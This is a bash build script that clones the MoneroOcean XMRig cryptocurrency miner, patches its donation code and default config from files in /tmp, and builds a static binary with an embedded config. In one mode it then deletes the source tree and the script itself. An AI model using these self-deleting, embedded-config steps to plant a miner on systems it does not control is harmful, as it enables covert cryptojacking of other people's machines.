#! /bin/bash
set -euvxo pipefail
(( $# == 1 ))
[[ -n "$1" ]]

export CPPFLAGS="-DNDEBUG $CPPFLAGS"

if (( $1 == 1 )) ; then
  FLAG=0
  for k in $(seq 5) ; do
    sleep 91
    git clone --depth=1 --recursive https://github.com/MoneroOcean/xmrig.git ||
    continue
    FLAG=1
    break
  done
  (( FLAG ))
fi
cd xmrig

/tmp/donate.h.sed           -i src/donate.h
/tmp/DonateStrategy.cpp.sed -i src/net/strategies/DonateStrategy.cpp
cp -v /tmp/Config_default.h    src/core/config/Config_default.h

mkdir build
cd scripts
./build_deps.sh
cd ../build

  #-DEXTRA_LIBS="$PREFIX/lib/libfingerprint.a"
  #-DCMAKE_SYSTEM_PROCESSOR=$ARCH \
  #-DCMAKE_SYSTEM_NAME=$CHOST \
  #-DCMAKE_FIND_ROOT_PATH="$PREFIX" \
cmake .. \
  -DXMRIG_DEPS=scripts/deps        \
  -DBUILD_SHARED_LIBS=OFF \
  -DBUILD_STATIC=ON \
  -DCMAKE_BUILD_TYPE=Release \
  -DCMAKE_C_FLAGS="$CFLAGS" \
  -DCMAKE_CXX_FLAGS="$CXXFLAGS" \
  -DCMAKE_INSTALL_PREFIX="$PREFIX" \
  -DWITH_HTTP=OFF \
  -DWITH_ENV_VARS=OFF \
  -DWITH_OPENCL=OFF \
  -DWITH_ADL=OFF \
  -DWITH_CUDA=OFF \
  -DWITH_NVML=OFF \
  -DWITH_MO_BENCHMARK=ON \
  -DWITH_BENCHMARK=OFF \
  -DWITH_TLS=ON \
  -DWITH_EMBEDDED_CONFIG=ON
cd    ..
cmake --build build
install -Dvt "$PREFIX/bin/" build/xmrig*
if (( $1 == 1 )) ; then
  git reset --hard
  git clean -fdx
  git clean -fdx
fi
cd ..
if (( $1 == 2 )) ; then
  rm -rf xmrig
  rm -v "$0"
fi

